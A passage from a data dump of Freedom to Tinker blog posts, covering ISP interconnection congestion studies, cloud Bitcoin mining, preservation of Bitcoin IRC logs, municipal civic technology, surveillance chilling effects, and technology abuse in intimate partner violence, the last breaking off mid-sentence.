decision, of course, except that it appears that some transit providers that deliver traffic between these CDNs and Comcast subscribers may have been ill-equipped to handle the additional load, as per the congestion that is apparent in the Measurement Lab plots. It is thus entirely likely that congestion occurred not only at the interconnection points between Comcast and their transit providers, but also within some of the transit providers themselves. An engineer at Cogent explicitly acknowledges their ability to handle the additional traffic in an email on the MLab-Discuss list: “Due to the severe level of congestion, the lack of movement in negotiating possible remedies and the extreme level of impact to small enterprise customers (retail customers), Cogent implemented a QoS structure that impacts interconnections during the time they are congested in February and March of 2014…Cogent prioritized based on user type putting its retail customers in one group and wholesale in another. Retail customers were favored because they tend to use applications, such as VoIP, that are most sensitive to congestion. M-Labs is set up in Cogent’s system as a retail customer and their traffic was marked and handled exactly the same as all other retail customers. Additionally, all wholesale customers traffic was marked and handled the same way as other wholesale customers. This was a last resort effort to help manage the congestion and its impact to our customers.” This email acknowledges that Cogent was prioritizing certain real-time traffic (which happened to also include Netflix traffic). If that weren’t enough of a smoking gun, Cogent also acknowledges prioritizing Measurement Lab’s test traffic, which independent analysis has also verified, and which artificially improved the throughput of this test traffic. Another mystery, then, is what caused the return to normal throughput in the Measurement Lab data: Was it the direct peering between Netflix and Comcast that relieved congestion in transit networks, or are we simply seeing the effects of Cogent’s decision to prioritize Measurement Lab traffic (or both). Perhaps one of the most significant observations that points to congestion in the transit providers themselves is that Measurement Lab observed congestion along end-to-end paths between their servers and multiple access ISPs (Time Warner, Comcast, and Verizon), simultaneously. It would be a remarkable coincidence if the connections between the access ISPs and their providers experienced perfectly synchronized congestion episodes for nearly a year. A possible explanation is that congestion is occurring inside the transit provider networks. What does measurement data tell us about the location of congestion? In short, it seems that congestion is occurring in both locations; it would be helpful, of course, to have more conclusive data and studies in this regard. To this end, some early studies have tried to zero in on the locations of congestion, with some limited success (so far). Roy Observations of Correlated Congestion Events. In August 2013, Swati Roy and I published a study analyzing latency data from the BISmark project that highlighted periodic, prolonged congestion between access networks in the United States and various Measurement Lab servers. By observing correlated latency anomalies and identifying common path segments and network elements across end-to-end paths that experienced correlated increases in latency, we were able to determine that more than 60% were close to the Measurement Lab servers themselves, not in the access network. Because the Measurement Lab servers are hosted in transit providers (e.g., Level 3, Cogent), one could reasonably assume that the congestion that we were observing was due to congestion near the Measurement Lab servers—possibly even within Cogent or Level 3. This study was both the first to observe these congestion episodes and the first to suggest that the congestion may be occurring in the networks close to the Measurement Lab servers themselves. Unfortunately, because the study did not collect traceroutes in conjunction with these observations, it was unable to attribute the congestion episodes to specific sets of common links or ASes, yet it was an early indicator of problems that might exist in the transit providers. Measurement Lab Report. In October 2014, the Measurement Lab reported on some of its findings in an anonymous technical report. The report concludes: “that ISP interconnection has a substantial impact on consumer Internet performance… and that business relationships between ISPs, and not major technical problems, are at the root of the problems we observed.” Unfortunately, this conclusion is not fully supported by the data or method from the study; the method that the study relies on is too imprecise to pinpoint the precise location of congestion. The method works as shown in the figure. Clients perform throughput measurements along end-to-end paths from vantage points inside access networks to Measurement Lab servers that are sitting in various transit ISPs. The method assumes that if there is no congestion along, say, the path between Cablevision and Cogent, but there is congestion on the path between Comcast and Cogent, then the point of congestion must be at the interconnection point between Comcast and Cogent. In fact, this method is not precise enough eliminate other possibilities: Specifically, because of the way Internet routing works, these two end-to-end paths could actually traverse a different set of routers and links within Cogent, depending on whether traffic was destined for Comcast or Cablevision. Unfortunately, this report also failed to consider traceroute data, and the vantage points from which the throughput measurements were taken are not sufficient to disambiguate congestion at interconnection points from congestion within the transit network. In the figures below, assume that the path between a measurement point in Comcast and the MLab server in Cogent is congested, but that the path between a measurement point in Cablevision and the server in Cogent is not congested. The red lines show conclusions that one might draw for possible congestion locations. The figure on the right illustrates why the MLab measurements are less conclusive than the report leads the reader to believe. The MLab report concludes that if the Comcast-Cogent path is congested, but the Cablevision-Cogent path is not, then the congestion is at the interconnection point. In fact, the cause for the congestion might be the interconnection point, but the location of congestion might also be on a disjoint link that is inside Cogent. The report also concludes that because traffic along paths from Verizon, Comcast, and Time Warner Cable to measurement points inside of Level 3 occurred in synchrony at different geographic locations, that the problems must be at interconnection points between these access providers and Level 3. It is unclear how the report reaches this conclusion. Given that multiple access providers see similar degradation, it is also possible that the Level 3 network itself is experiencing congestion that is manifesting at multiple observation points as a result of under-provisioning. Without knowing the vantage points where the measurements were taken from, it is difficult to disambiguate multiple correlated congestion events at interconnects from one or more congestion points that are internal to the transit network itself. In summary, the report’s conclusion that “[the data] points to interconnection-related performance degradation” is simply not conclusively supported by the data. The MLab report concludes that if the paths between multiple access providers and multiple MLab servers in the transit provider are congested, then interconnection between the networks is the location of congestion. In fact, it is equally likely that this congestion is occurring on one or more links inside the transit provider. There might even be a single link inside the transit provider that causes congestion on these multiple end-to-end paths. CAIDA Report on Congestion. In November 2014, researchers from CAIDA published a paper exploring an alternate method for locating congestion. The idea, in short, is to issue “ping” messages to either side of a link along an end-to-end Internet path and observe differences in the round-trip times of the replies that come back from either side of the link. This method appears to point to congestion at the interconnection points, but it depends on being able to use the traceroute tool to accurately identify the IP addresses on either side of a link. This, in fact, turns out to be much more difficult than it sounds: because an interconnection point must be on the same IP subnet, either side of the interconnection point with have an IP address from one of the two ISPs. The numbering along the path will thus not change on the link itself, but rather on one side of the link or the other. Thus, it is incredibly tricky to know whether the link being measured is actually the interconnection point or rather one hop into one of the two networks. We explored this problem in a 2003 study (See Figure 4, Section 3.3), where we tried to study failures along end-to-end Internet paths, but our method for locating these interconnection points is arguably ad hoc. There are other complications, too, such as the fact that traceroute “replies” (technically, ICMP time exceeded messages) often have the IP address of the interface that sends the reply back to the source on the reverse path, not the IP address along the forward path. Of course, the higher latencies observed could also be on a (possibly asymmetric) reverse path, not on the forward path that the traceroute attempts to measure. The paper provides some evidence to suggest that congestion is occurring at interconnection points (Theory #1), but it is inconclusive (or at least silent) as to whether congestion is also occurring at other points along the path, such as within the transit providers. To quote the paper: “The major challenge is not finding evidence of congestion but associating it reliably with a particular link. This difficulty is due to inconsistent interface numbering conventions, and the fact that a router may have (and report in ICMP responses) IP interface addresses that come from third-party ASes. This problem is well understood, but not deeply studied.” In the recent open Internet order, the FCC also acknowledged its inability to pinpoint congestion: “We decline at this time to require disclosure of the source, location, timing, or duration of network congestion, noting that congestion may originate beyond the broadband provider’s network and the limitations of a broadband provider’s knowledge of some of these performance characteristics…While we have more than a decade’s worth of experience with last-mile practices, we lack a similar depth of background in the Internet traffic exchange context.” Where do we go from here? We need better methods for identifying points of congestion along end-to-end Internet paths. Part of the difficulty in the above studies is that they are trying to infer properties of links fairly deep into the network using indirect (and imprecise) methods. The lack of precision points mainly to the poor fidelity of existing tools (e.g., traceroute), but the operators of these ISPs clearly know the answers to many of these questions. In some cases (e.g., Cogent), the operators have conceded that their networks are under-provisioned for certain traffic demands and have not properly disclosed their actions (indeed, Cogent’s website actually has a puzzling and apparently contradictory statement that it does not prioritize any traffic). In other cases, ISPs are understandably guarded about revealing the extent (and location) of congestion in their networks—perhaps justifiably fearing that divulging such information might put them at a competitive disadvantage. To ultimately get to the bottom of these congestion questions, we certainly need better methods, some of which might involve ISPs revealing, sharing, or otherwise combining information about congestion or traffic demands with each other in ways that still respect business sensitivities."
"60","2015-08-03","2023-03-24","https://freedom-to-tinker.com/2015/08/03/does-cloud-mining-make-sense/","[Paul Ellenbogen is a second year Ph.D. student at Princeton who’s been looking into the economics and game theory of Bitcoin, among other topics. He’s a coauthor of our recent paper on Namecoin and namespaces. — Arvind Narayanan] Currently, if I wanted to mine Bitcoin I would need to buy specialized hardware, called application-specific integrated circuits (ASICs). I would need to find space for my hardware, which could take up a considerable amount of space. I might need to install a new cooling system into the facility to dissipate the considerable amounts of heat generated by the hardware. Or I could buy a cloud mining contract. Cloud mining companies bill themselves as companies that take care of all of the gritty details and allow the consumer to directly buy hash power with dollars. Most cloud mining companies offer contracts for varying term lengths, going anywhere from on the order of weeks to perpetuity. For example, I could pay $300, and receive one terrahash per second for the next year. As soon as the cloud hashing provider receives my money, they start up a miner, or allocate me existing cycles, and I should start earning bitcoins in short order. Sounds easy right? Cloud mining has a bad track record. Many cloud mining services have closed up shop and run off with customer money. Examples include PBmining, lunaminer, and cloudminr.io. Gavin Andresen, a Bitcoin Core developer, once speculated that cloud mining doesn’t make any sense and that most of these services will end up as scams. Cloud mining has been a popular front for Ponzi schemes, investment frauds where old customers or investors are paid with the money of new customers. In the case of cloud mining Ponzi schemes, bitcoins to pay old contracts are furnished from the payment of new customers. Ponzi schemes tend to collapse when the flow of new customers dries up, or when a large number of customers try to cash out. Cloud mining is a particularly appealing target for Ponzi schemes because the second failure case, cashing out, is not an option for those holding mining contracts. The contracts stipulate a return of bitcoins determined by hash rate. This means Ponzi scheme operators only need to keep recruiting new users for as long as possible. Bitcointalk user Puppet points out a set of 7 useful criteria for spotting cloud mining scams. Out of the 42 operations puppet examines, they identify 30 operations as scams, 14 of which have already ceased operation. Yet cloud mining persists. That so many cloud mining operations end up being scams may appeal to our basic business intuition. Compare a cloud miner to a traditional bitcoin miner. A traditional bitcoin miner mines bitcoins and sells them on the exchange at their current market rate. It seems that the only way for a cloud miner to do better than a traditional bitcoin miner selling bitcoins at market price is at the expense of the cloud mining customer. It appears there is no way for both cloud miner and their customer to walk away better off. Yet cloud mining and at least some interest in cloud mining persists. I would like to offer some possible scenarios where cloud mining may deliver the hashes that customers order. Hired guns? Papers that propose attacks against bitcoin often pose “An attacker with X% of the hash power could do Y.” For example, in selfish mining, as first described by Eyal et al, with 33% of the mining power an attacker could force the rest of the network to mine on top of their blocks. Cloud miners could be used for block withholding attacks too. An important feature of many of these attacks is that the mining power need not be used all the time. These attacks would require flexibility in the mining software the attackers are using, as most off the shelf mining software (thankfully) does not have these attacks built in. Most cloud mining set ups I have looked at don’t allow for enough flexibility to launch attacks, nor are the contract periods on most services short enough. Cloud mining customers typically have a simple web interface, and in the best case are able to chose which pools they join, but they do not have any sort of scriptable direct interface to the mining hardware. At the moment, cloud miners are probably not supporting themselves by executing attacks for others. Regulatory loophole? Individuals may try to use cloud mining to circumvent Bitcoin regulations, such as know-your-customer. If I want to turn my dollars into bitcoins, I can buy bitcoins at an exchange, but that exchange would have to know my true identity in order to comply with regulations. Unscrupulous individuals may not want to link their identity and cash flow reported to the government. Cloud mining operators and unscrupulous customers may try to skirt these regulations by claiming cloud mining operations are not exchanges or banks, rather they merely rent computer hardware like any cloud computing provider, meaning they do not need to comply with banking regulation. It is unlikely this would be viable long term, or even short term, as regulators would become wise to these sorts of regulatory loopholes and close. This paragraph is the most speculative on my part, as I am neither a regulator nor a lawyer, so I don’t have expertise to draw on from either of those fields. Financial instrument? Currently most bitcoin miners take on two roles, managing the mining hardware and managing the financial risk involved in mining. A more compelling justification for cloud miners existence is that cloud mining contracts allow a cloud mining provider to avoid volatility in the exchange rate of bitcoin and the variability in the hash rate. Cloud mining is a means of hedging risk. If cloud miners can enter contracts to provide a certain hash rate to a customer for a length of time, the cloud miner does not need to concern themselves with the exchange rate nor hash rate once the contract begins. It then becomes the job of the customer contracting the cloud miner to manage the risk presented by volatility in the exchange rate. This would allow the cloud miner to specialize in buying, configuring, and maintaining mining hardware, and other individuals to specialize in managing risk related to bitcoin. As the financial instruments surrounding cryptocurrencies become more sophisticated, a terrahash could become another just another cryptocurrency security that is traded. Acknowledgment: I would like to thank Joseph Bonneau for the contribution of “cloud mining as a means of managing risk” concept."
"61","2016-09-15","2023-03-24","https://freedom-to-tinker.com/2016/09/15/bitcoins-history-deserves-to-be-better-preserved/","Much of Bitcoin’s development has happened in the open in a transparent manner through the mailing list and the bitcoin-dev IRC channel. The third-party website BitcoinStats maintains logs of the bitcoin-dev IRC chats. [1] This resource has proved useful is linked to by other sources such as the Bitcoin wiki. When reading a blog post about the 2013 Bitcoin fork, I noticed something strange about a discussion on BitcoinStats that was linked from it. Digging around, I found that Wayback Machine version of the logs from BitcoinStats are different; the log had been changed at some point. I was curious if only this conversation was truncated, or if other logs had changed. After scraping the current version of the BitcoinStats website and scraping the Wayback Machine versions, I found that many pages are different from their Wayback Machine version. For example on the log for January 11, 2016 many entries for the user by the username ‘Lightsword’ are now blank. The number and nature of the errors makes it appear there might be a bug in the backend of the BitcoinStats website, rather than a malicious censure of certain conversations. There may not be a complete history of the IRC channels anywhere, as the Wayback Machine also has holes in its coverage. It is unfortunate that artifacts of Bitcoin’s development history are being lost. There is value in knowing how critical decisions were made in frantic hours of the 2013 fork. An important part of learning from history is having access to historical data. Decisions that shape what Bitcoin is today were originally discussed on IRC, and those decisions will continue to shape Bitcoin. Understanding what went right and what went wrong can inform future technology and community design. The lesson is that online communities must make deliberate efforts to preserve important digital artifacts. Often this is merely a matter of picking the right technology. If GitHub were to disappear tomorrow, all of Bitcoin’s code history would not be lost thanks to git’s decentralized and distributed nature. All of Bitcoin’s transaction history is likewise famously replicated and resilient to corruption or loss. Preserving the IRC logs would not be difficult. The community could distribute the logs via BitTorrent, as Wikipedia does with its content. Another option is to use the form the Wayback Machine provides to ensure the archiving of a page (to minimize effort, one could automate the invocation of this functionality). Given how important preserving this data is and how easy it is, it seems worthwhile. [1] IRC as a whole has a culture of ephemerality, and so Freenode, the server that hosts the bitcoin-dev IRC channel doesn’t provide logs."
"62","2013-11-12","2023-03-24","https://freedom-to-tinker.com/2013/11/12/inject-new-energy-into-problem-solving-principle-8-for-fostering-civic-engagement-through-digital-technologies/","In response to my recent post arguing that the Federal government needs to use the social web more effectively as a tool for improving information sharing between the Federal government and the public, Michael Herz from the Benjamin N. Cardozo School of Law reached out and directed me to a comprehensive report he recently authored for the consideration of the Administrative Conference of the United States entitled “Using Social Media in Rulemaking: Possibilities and Barriers.” One of Mr. Herz’s colleagues described the report’s tone as one of “skeptical optimism.” Mr. Herz asked me specifically about the role of social media in the Federal agency rulemaking process. In short, I generally agree with his statement that “social media culture is at odds with the fundamental characteristics of notice-and-comment rulemaking” because filing insightful comments requires “time, thought, study of the agency proposal and rationale, articulating reasons rather than…off-the-top-of-one’s-head assertions of a bottom line.” Social media, we both agree, however, is a valuable tool for Federal agencies to use to inform the public – particularly those people or groups whom the agency believes may have a vested interest in ongoing rulemakings. Our e-mail exchange has me thinking now about why many governments and residents are embracing technology-based solutions for urban problems whereas the Federal government, as exemplified by the problems with the Affordable Care Act implementation, has not been as effective in using the Internet, wireless technology and social media to deliver services to the public. Today, I will discuss three reasons why it is easier to inject new energy into technology-based problem solving in local communities. First, constituent service is critical to the success of local politicians. As Mr. Herz states, “[p]oliticians want – indeed, need – to be seen as providing direct, tangible benefits to constituents.” Almost everyone in a city knows whether their trash was picked up on-time or if the snow plow came through and there are electoral consequences for not delivering. In contrast, while I think almost every citizen would like to see Federal agencies regulate as effectively and efficiently as possible, it would be virtually impossible to reach agreement across the political spectrum about what constitutes superb agency rulemaking. Mayors around the country are welcoming outside experts such as Code for America Fellows or academics partnering on short term projects into their offices to assist them in improving service delivery. Mayors are hoping that these experts’ values and skills allow city leaders to take on more ambitious projects than they could on their own. I spoke with Emily Lieb, a Bloomberg Innovation Fellow in Atlanta, and members of her team earlier this year. Emily’s team is working to develop a new 311 customer service system for Atlanta, scheduled to become operational in Spring 2014. In the News Release announcing a new customer service model and the beginning of 311 implementation, Atlanta Mayor Kasim Reed said, “All Atlanta residents and visitors should expect and receive best-in-class customer service every time they interact with the city.” In working to meet that goal, Emily’s team has been changing communications strategies, internal processes and making information on Atlanta’s website more user-friendly, particularly for business licensing, by adding interactive tools that teach residents what to expect throughout the process. Second, as a result of local governments’ smaller size and service delivery-focused culture, outside experts can more quickly introduce innovative ideas and change the culture of an organization. As Atlanta has sought to improve its customer service, Emily told me that the Mayor created a 311 Call Center Governance Board to ensure that everyone at “the Executive level,” including other elected officials accountable to their constituents across the city, was continually informed about the initiative. Emily felt that the biggest challenge to institutionalizing the internal customer service changes in Atlanta’s government was not other elected officials, but winning over skeptical mid-level the managers. If mid-level management supports the initiative, then it can continue to be successful once the Fellows are gone. The third reason it is easier to inject new energy into technology-based problem solving in local communities is that the very things that social media and e-mail groups do well – creating new on-line communities and allowing existing communities to stay connected – are a great fit for urban areas where people are often located close together physically and may even share common goals or concerns, but often don’t know each other. Social media and e-mail groups eliminate the information inefficiencies that in the past made taking collective action to solve a problem very difficult or time-consuming. In addition, in many neighborhoods, people have been using digital technology to share information for a decade. A local government adopting technology-based problem solving, therefore, appears to residents to be the natural evolution of the relationship between citizens and government. As the person responsible for improving the usefulness of Atlanta’s social media platforms, one of Anne Torres’s goals has been to define what platforms are best for certain content and audiences. She told me that Twitter is good, for example, for sharing links highlighting positive aspects of the city and providing information on how to pay bills, including traffic tickets. In contrast, Facebook is useful for sharing photos of public events and information about activities of Atlanta’s government that people otherwise wouldn’t know about. Internally, Ms. Torres set up a style guide for city employees and held a government social media summit to get people on board. Agencies across the city are all working through Hootsuite. If a resident is asking the City to fix a leak in the street, Hootsuite sends flags to the right organization within the government. The Mayor’s office can monitor information from all dashboards and, for example, track constituent requests that come in through Twitter. By no means is it impossible for the Federal government to do be innovative in its delivery of constituent services. There are successes such as the highly regarded Consumer Financial Protection Bureau website, which was created in part by people hired through a two-year fellowship program for “developers, graphic designers and UX pros.” The Presidential Innovation Fellows program brings together innovators from the private sector, non-profits and academia to work in government for 6-13 months to help develop solutions to difficult technical problems. At this moment though, Mayors are government’s leaders in finding innovative ways to use the Internet, wireless technology and social media to deliver services to their constituents. It’s time for the Federal government to catch up."
"63","2018-02-14","2023-03-24","https://freedom-to-tinker.com/2018/02/14/misconceptions-about-the-impact-of-surveillance/","Does surveillance impact behavior? Or is its effect, if real, only temporary or trivial? Government surveillance is back in the news thanks to the so-called “Nunes memo”, making this is a perfect time to examine new research on the impact of surveillance. This includes my own recent work, as my doctoral research at the Oxford Internet Institute, University of Oxford examined “chilling effects” online, that is, how online surveillance, and other regulatory activities, may impact, chill, or deter people’s activities online. Though the controversy surrounding the Nunes memo critiquing FBI surveillance under the Foreign Intelligence Surveillance Act (FISA) is primarily political, it takes place against the backdrop of the wider debate about Congressional reauthorization of FISA’s Section 702, which allows the U.S. Government to intercept and collect emails, phone records, and other communications of foreigners residing abroad, without a warrant. On that count, civil society groups have expressed concerns about the impact of government surveillance like that available under FISA, including “chilling effects” on rights and freedoms. Indeed, civil liberties and rights activists have long argued, and surveillance experts like David Lyon long explained, that surveillance and similar threats can have these corrosive impacts. Yet, skepticism about such claims is common and persistent. As Kaminski and Witov recently noted, many “evince skepticism over the effects of surveillance” with deep disagreements over the “effects of surveillance” on “intellectual queries” and “development”. But why? The answer is complicated but likely lies in the present (thin) state of research on these issues, but also common conceptions, and misconceptions, about surveillance and impact on people and broader society. Skepticism and assumptions about impact Skepticism about surveillance impacts like chilling effects is, as noted, persistent with commentators like Stanford Law’s Michael Sklansky insisting there is “little empirical support” for chilling effects associated with surveillance or Leslie Kendrick, of UVA Law, labeling the evidence supporting such claims “flimsy” and calling for more systematic research on point. Part of the problem is precisely this: the impact of surveillance—both mass and targeted forms—is difficult to document, measure, and explore, especially chilling effects or self-censorship. This is because demonstrating self-censorship or chill requires showing a counterfactual state of affairs: that a person would have said something or done something but for some surveillance threat or awareness. But another challenge, just as important to address, concerns common assumptions and perceptions as to what surveillance impact or chilling effects might look like. Here, both members of the general public as well as experts, judges, and lawyers often assume or expect surveillance to have obvious, apparent, and pervasive impact on our most fundamental democratic rights and freedoms—like clear suppression of political speech or the right to peaceful assembly. A great example of this assumption, leading to skepticism about whether surveillance may promote self-censorship or have broader societal chilling effects—is here expressed by University of Chicago Law’s Eric Posner. Posner, a leading legal scholar who also incorporates empirical methods in his work, conveys his skepticism about the “threat” posed by National Security Agency (NSA) surveillance in a New York Times “Room for Debate” discussion, writing: This brings me to another valuable point you made, which is that when people believe that the government exercises surveillance, they become reluctant to exercise democratic freedoms. This is a textbook objection to surveillance, I agree, but it also is another objection that I would place under “theoretical” rather than real. Is there any evidence that over the 12 years, during the flowering of the so-called surveillance state, Americans have become less politically active? More worried about government suppression of dissent? Less willing to listen to opposing voices? All the evidence points in the opposite direction… It is hard to think of another period so full of robust political debate since the late 1960s—another era of government surveillance. For Posner, the mere existence of “robust” political debate and activities in society is compelling evidence against claims about surveillance chill. Similarly, Sklansky argues not only that there is “little empirical support” for the claim that surveillance would “chill independent thought, robust debate, personal growth, and intimate friendship”— what he terms “the stultification thesis”—but like Posner, he finds persuasive evidence against the claim “all around us”. He cites, for example, the widespread “sharing of personal information” online (which presumably would not happen if surveillance was having a dampening effect); how employer monitoring has not deterred employee emailing nor freedom of information laws deterred “intra-governmental communications”; and how young people, the “digital natives” that have grown up with the internet, social media, and surveillance, are far from stultified and conforming but arguably even more personally expressive and experimental than previous generations. In light of all that, Sklansky dismisses surveillance chill as simply not “worth worrying about”. I sometimes call this the “Orwell effect”—the common assumption, likely thanks to the immense impact Orwell’s classic novel 1984 has had on popular culture, that surveillance will have dystopian societal impact, with widespread suppression of personal sharing, expression, and political dissent. When Posner and Sklansky (and others that share these common expectations) do not see these more obvious and far reaching impacts, they then discount more subtle and less apparent impacts and effects that may, over the long term, be just as concerning for democratic rights and freedoms. Of course, theorists and scholars like Daniel Solove have long interrogated and critiqued Orwell’s impact on our understanding of privacy and Sklansky is himself wary of Orwell’s influence, so it is no surprise his work also shapes common beliefs and conceptions about the impact of surveillance. That influence is compounded by the earlier noted lack of systematic empirical research providing more grounded insights and understanding. This is not only an academic issue. Government surveillance powers and practices are often justified with reference to other national security concerns and threats like terrorism, as this House brief on the FISA re-authorization illustrates. If concerns about chilling effects associated with surveillance and other negative impacts are minimized or discounted based on misconceptions or thin empirical grounding, then challenging surveillance powers and their expansion is much more difficult, with real concrete implications for rights and freedoms. So, the challenge for documenting, exploring, and understanding the impact of surveillance is really two-fold. The first is one of research methodology and design: designing research to document the impact of surveillance, and a second concerns common assumptions and perceptions as to what surveillance chilling effects might look like—with even experts like Posner or Sklansky assuming widespread speech suppression and conformity due to surveillance. New research, new insights Today, new systematic empirical research on the impact of surveillance is being done, with several recent studies having documented surveillance chilling effects in different contexts, including recent studies by Stoycheff [1], Marthews and Tucker [2], as well as my own recent research. This includes an empirical legal study[3] on how the Snowden revelations about NSA surveillance impacted Wikipedia use—which received extensive media coverage in the U.S. and internationally— and a more recent study[4], which I wrote about recently in Slate, that examined among other things how state and corporate surveillance impact or “chill” certain people or groups differently. A lot of this new work was not possible in previous times, as it is based on new forms of data being made available to researchers and insights gleaned from analyzing public leaks and disclosures concerning surveillance like the Snowden revelations. The story these and other new studies tell when it comes to the impact of surveillance is more complicated and subtle, suggesting the common assumptions of Posner and Sklansky are actually misconceptions. Though more subtle, these impacts are no less concerning and corrosive to democratic rights and freedoms, a point consistent with the work of surveillance studies theorists like David Lyon[5] and warnings from researchers at places like the Citizen Lab[6], Berkman Klein Center[7], and here at the CITP[8]. In subsequent posts, I will discuss these studies more fully, to paint a broader picture of surveillance effects today and, in light of increasingly sophisticated targeting and emerging automation technologies, tomorrow. Stay tuned. * Jonathon Penney is a Research Affiliate of Princeton’s CITP, a Research Fellow at the Citizen Lab, located at the University of Toronto’s Munk School of Global Affairs, and teaches law as an Assistant Professor at Dalhousie University. He is also a research collaborator with Civil Servant at the MIT Media Lab. Find him on twitter at @jon_penney. — [1] Stoycheff, E. (2016). Under Surveillance: Examining Facebook’s Spiral of Silence Effects in the Wake of NSA Internet Monitoring. Journalism & Mass Communication Quarterly. doi: 10.1177/1077699016630255 [2] Marthews, A., & Tucker, C. (2014). Government Surveillance and Internet Search Behavior. MIT Sloane Working Paper No. 14380. [3] Penney, J. (2016). Chilling Effects: Online Surveillance and Wikipedia Use. Berkeley Tech. L.J., 31, 117-182. [4] Penney, J. (2017). Internet surveillance, regulation, and chilling effects online: A comparative case study. Internet Policy Review, forthcoming [5] See for example: Lyon, D. (2015). Surveillance After Snowden. Cambridge, MA: Polity Press; Lyon, D. (2006). Theorizing surveillance: The panopticon and beyond. Cullompton, Devon: Willan Publishing; Lyon, D. (2003). Surveillance After September 11. Cambridge, MA: Polity. See also Marx, G.T., (2002). What’s New About the ‘New Surveillance’? Classifying for Change and Continuity. Surveillance & Society, 1(1), pp. 9-29; Graham, S. & D. Wood. (2003). Digitising Surveillance: Categorisation, Space, Inequality, Critical Social Policy, 23(2): 227-248. [6] See for example, recent works: Parsons, C., Israel, T., Deibert, R., Gill, L., and Robinson, B. (2018). Citizen Lab and CIPPIC Release Analysis of the Communications Security Establishment Act. Citizen Lab Research Brief No. 104, January 2018; Parsons, C. (2015). Beyond Privacy: Articulating the Broader Harms of Pervasive Mass Surveillance. Media and Communication, 3(3), 1-11; Deibert, R. (2015). The Geopolitics of Cyberspace After Snowden. Current History, (114) 768 (2015): 9-15; Deibert, R. (2013) Black Code: Inside the Battle for Cyberspace, (Toronto: McClelland & Stewart). See also [7] See for example, recent work on the Surveillance Project, Berkman Klein Center for Internet and Society, Harvard University. [8] See for example, recent work: Su, J., Shukla, A., Goel, S., Narayanan, A., De-anonymizing Web Browsing Data with Social Networks. World Wide Web Conference 2017; Zeide, E. (2017). The Structural Consequences of Big Data-Driven Education. Big Data. June 2017, 5(2): 164-172, https://doi.org/10.1089/big.2016.0061;MacKinnon, R. (2012) Consent of the networked: The worldwide struggle for Internet freedom. New York: Basic Books.; Narayanan, A. & Shmatikov, V. (2009). See also multiple previous Freedom to Tinker posts discussing research/issues point."
"64","2018-02-23","2023-03-24","https://freedom-to-tinker.com/2018/02/23/how-tech-is-failing-victims-of-intimate-partner-violence-thomas-ristenpart-at-citp/","What technology risks are faced by people who experience intimate partner violence? How is the security community failing them, and what questions might we need to ask to make progress on social and technical interventions? Speaking Tuesday at CITP was Thomas Ristenpart (@TomRistenpart), an associate professor at Cornell Tech and a member of the Department of Computer Science at Cornell University. Before joining Cornell Tech in 2015, Thomas was an assistant professor at the University of Wisconsin-Madison. His research spans a wide range of computer security topics, including digital privacy and safety in intimate partner violence, alongside work on cloud computing security, confidentiality and privacy in machine learning, and topics in applied and theoretical cryptography. Throughout this talk, I found myself overwhelmed by the scope of the challenges faced by so many people– and inspired by the way that Thomas and his collaborators have taken thorough, meaningful steps on this vital issue. Understanding Intimate Partner Violence Intimate partner violence (IPV) is a huge problem, says Thomas. 25% of women and 11% of men will experience rape, physical violence, and/or stalking by an intimate partner, according to the National Intimate Partner and Sexual Violence Survey. To put this question in context for tech companies, this means that 360 million Facebook users and 252 million Android users will experience this kind of violence. Prior research over the years has shown that abusers are taking advantage of technology to harm victims in a wide range of ways, including spyware, harassment, and non-consensual photography. In a team with Nicki Dell, Diana Freed, Karen Levy, Damon McCoy, Rahul Chatterjee, Peri Doerfler, and Sam Havron, Thomas and his collaborators have working with the New York City Mayor’s office to Combat Domestic Violence (NYC CDV). To start, the researchers spent a year doing qualitative research with people who experience domestic violence. The research that Thomas is sharing today draws from that work. The research team worked with the New York City Family Justice Centers, who offer a range of services for domestic violence, sex trafficking, and elder abuse victims– from civil and legal services to access to shelters, counseling, and support from nonprofits. The centers were a crucial resource for the researchers, since they connect nonprofits, government actors, and survivors and victims. Over seriesof year-long qualitative studies (see also this paper), researchers held 11 focus groups with 39 women who speak English and Spanish from 18-165. Most of them are no longer working with the abusive partner. They also held semi-structured interviews with 50 professionals working on IPV– case managers, social workers, attorneys/paralegals, and police officers. Together, this research represents the largest and most demographically diverse study to date on IPV. Common Technology Attacks in Intimate Partner Violence Situations The researchers spotted a range of common themes across clients of the NYC CDV. They talked about stalkers who accessed their phones and social media, installed spyware, took compromising images through the spyware, and then impersonating them to use the account to send compromising, intimate images to employers, family, and friends. Abusers are taking advantage of every possible technology to create problems through many modes. Overall, they identified four kinds of common attacks: In ownership-based attacks, the abuser owns the account that the victim is using. This gives them immediate access to controlling the device. Often people will buy a device for someone else to gain a foothold in that person’s life and home. In account/device compromise, someone compels, guesses, or otherwise compromises passwords. Harmful messages or posts involve calling/texting/messaging the victim. This involves harassing a victim’s friends/family, and sometimes encouraging other people to harass that person by proxy. Abusers also exposed private information: blackmailing someone by threat of exposure, sharing non-consensual intimate images, and creating fake profiles/advertisements for that person on other sites. In many of these cases, abusers are re-purposing ordinary software for some kind of unhelpful purpose. For example, abusers use two-factor authentication to prevent victims from accessing and recovering access to their own account. Non-Technical Infrastructures Aren’t Helping Victims & Professionals with Technical Issues Thomas tells us that despite these risks, they didn’t find a single technologist in the network of support for people facing intimate partner violence. So it’s not surprising that these services don’t have any best practices for evaluating technology risks. On top of that, victims overwhelmingly report having insufficient technology understanding to deal with tech abuse. Abusers are typically considered to be “more tech-savvy” than victims, and professionals overwhelmingly report having insufficient technology understanding to help with tech abuse. Many of them just google as they go. Thomas also points out that the intersection of technology and intimate partner violence raises important legal and policy issues. First, digital abuse is usually not recognized as a form of abuse that warrants a protection order. When someone goes to a family court, they have to convince a judge to get a protection order- and judges aren’t convinced by digital harassment– even though the protection order can legally restrict an abuser from sending the message. Second, when an abuser creates a fake account on a site like Tinder and creates “come rape me” style ads, the abuser is technically the legal owner of the account, so it can be difficult to take down the ads, especially for smaller websites that don’t respond to copyright takedown requests. Technical Mechanisms are Failing Too: Context Undermines Existing Security Systems Abusers aren’t the sophisticated cyber-operatives that people sometimes talk about at security conferences. Instead, researchers saw two classes of attacks: (a) UI-bound adversaries: an adversarial but authenticated user who interacts with the system via the normal user interface, and (b) Spyware adversaries, who installs/repurposes commodity software for surveillance of the victim. Neither of these require technical sophistication. Why are these so effective? Thomas says that the reason is that the threat models and the assumptions in the security world don’t match threats. For example, many systems are designed to protect from a stranger on the internet who doesn’t know the victim personally and connects from elsewhere. With intimate partner violence, the attacker knows the victim personally, they can guess or compel disclosure, they may connect from the victim’s computer or same home, and may own the account or device that’s being used. The abuser is often an earner who pays for accounts and devices. The same problems apply with fake accounts and detection of abusive content. Many fake social media profiles obviously 